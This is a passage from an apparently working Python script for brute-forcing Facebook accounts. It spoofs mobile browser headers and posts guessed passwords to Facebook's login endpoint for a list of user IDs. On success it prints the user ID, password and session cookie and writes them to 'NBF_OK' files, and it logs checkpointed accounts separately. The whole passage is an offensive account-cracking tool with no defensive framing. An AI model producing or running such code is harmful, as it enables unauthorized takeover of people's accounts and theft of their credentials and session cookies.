fGL5_gxWO5TJEOWEU8iUkrPRwmV5_FVA1un8_c6MEipCORUOcKgcuI45tNp1MWZ4bDwbtpuYaA290CkJwpPtWJRJ8ce2lT_cRbprHhRA_B5VVbB-77vDaoFV3rQyLV84I0Jr6HjKcQU0nnLa6phrXnP3cvodn8gUvts&hrc=1&wtsid=rdr_0jS123Qm3xdrhh2Qc&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0', 
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {
'authority': 'm.facebook.com',
'accept': '*/*',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type': 'application/x-www-form-urlencoded',
'dpr': '2',
'origin': 'https://m.alpha.facebook.com',
'referer':'https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=467906450393051&kid_directed_site=0&app_id=467906450393051&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3DfNBNHEScN9X4Bkhxf7QKwOq0%26client_id%3D467906450393051%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbb8140ae-5f4b-494a-bcdc-4a23a7a3beb5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.krafton.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DfNBNHEScN9X4Bkhxf7QKwOq0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1707402570&subno_key=AaGNA7BkzdBj7_VZWCmSSlXd9qVDBPgdCNdArwpV89AeiqGkwRZWLPZ23Eyac4gxcx2oR8Rq8GrVxwMg29NSjVX9J52OzwZWR7XDfUoP4fUw8HtRxgnX-1EjMso7TH9Yc_dDKKoReoGfSpdV5DMVE1o7llDCdcgzfGL5_gxWO5TJEOWEU8iUkrPRwmV5_FVA1un8_c6MEipCORUOcKgcuI45tNp1MWZ4bDwbtpuYaA290CkJwpPtWJRJ8ce2lT_cRbprHhRA_B5VVbB-77vDaoFV3rQyLV84I0Jr6HjKcQU0nnLa6phrXnP3cvodn8gUvts&hrc=1&wtsid=rdr_0jS123Qm3xdrhh2Qc&_rdr ',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(110,120))}"',
'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(110,120))}.0.{str(rr(3000,6000))}.{str(rr(110,120))}"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': ua,
'viewport-width': f'{str(rr(300,999))}',
'x-asbd-id': '129477',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'x-requested-with': 'XMLHttpRequest',
'x-response-format': 'JSONStream',
}
			params = {
'refsrc': 'deprecated',
'lwv': '100',
}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?api_key=467906450393051&auth_token=e010ed73ed0f57564d84776247dc5f9f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3DfNBNHEScN9X4Bkhxf7QKwOq0%26client_id%3D467906450393051%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbb8140ae-5f4b-494a-bcdc-4a23a7a3beb5%26tp%3Dunspecified&refsrc=deprecated&app_id=467906450393051&cancel=https%3A%2F%2Faccounts.krafton.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DfNBNHEScN9X4Bkhxf7QKwOq0%23_%3D_&lwv=100',params=params,headers=headers,data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				oks+=1
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{A}[{S}>{A}] User : {G1}{idf}\n{A}[{S}>{A}] Pass : {G1}{pw}\n{A}[{S}>{A}] Kuki : {B}{kuki}\n')
				open('NBF_OK/'+nbf_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cps+=1
				print(f'\r{A}[{S}>{A}] User : {Y}{idf}\n{A}[{S}>{A}] Pass : {Y}{pw}\n{A}[{S}>{A}] Ugen : {X3}{ua}\n')
				open('NBF_CP/'+nbf_cp,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

#__________________ SYSYEM CONTROL __________________#
if __name__ == '__main__':
	try:os.mkdir('NBF_OK')
	except:pass
	try:os.mkdir('NBF_CP')
	except:pass
	try:os.system('clear')
	except:pass
	Main()